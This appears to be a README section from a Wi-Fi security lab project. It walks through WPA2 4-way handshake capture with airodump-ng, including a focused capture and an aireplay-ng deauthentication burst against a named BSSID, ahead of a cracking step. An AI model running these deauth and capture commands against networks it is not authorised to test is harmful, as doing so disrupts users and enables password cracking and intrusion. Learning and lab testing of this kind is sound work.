# 📡 Handshake Capture

This component documents the reconnaissance and targeted capture phase — discovering the target access point with `airodump-ng`, locking onto it, and collecting the WPA2 4-way handshake.

---

## Overview

```
Airspace Scan (airodump-ng)
        │
        ▼
Target Identified (BSSID + Channel)
        │
        ▼
Focused Capture (airodump-ng -c <ch> --bssid <BSSID> -w <file>)
        │
        ▼
Deauth Burst (aireplay-ng --deauth)
        │
        ▼
WPA Handshake Captured ✔
```

---

## Step 1 — Airspace Scan

```bash
sudo airodump-ng wlan0mon
```

This lists every access point within range. Note the **BSSID** and **CH** (channel) of your own target network.

---

## Step 2 — Focused Capture

Narrow the capture to the single target to keep the `.cap` file clean:

```bash
sudo airodump-ng -c 6 --bssid F6:14:62:44:52:5B -w capture wlan0mon
```

| Flag | Meaning |
|------|---------|
| `-c 6` | Lock to channel 6 |
| `--bssid` | Filter to a single access point |
| `-w capture` | Write output files prefixed `capture` |

Leave this running and move to the deauth step.

---

## Step 3 — Deauthentication Burst

Sending a short burst of deauth frames causes associated clients to drop and immediately reconnect, producing the 4-way handshake without waiting for an organic reconnection:

```bash
sudo aireplay-ng --deauth 4 -a F6:14:62:44:52:5B wlan0mon
```

Watch the `airodump-ng` window for `WPA handshake: <BSSID>` in the top-right corner — that confirms capture.

---

## Failure Case

If `aircrack-ng capture-01.cap` reports **"0 handshakes"** or **"No EAPOL data"**, the capture missed the handshake exchange. Causes:

- No client was associated during the deauth window
- The deauth frames never reached the client
- Wrong channel was selected

Repeat the deauth burst or wait for a natural client reconnection.

---

## Output

The captured file set (`capture-01.cap`, `.csv`, `.kismet.csv`, `.log.csv`) is written to the working directory. The `.cap` file is what gets fed into the cracking step.
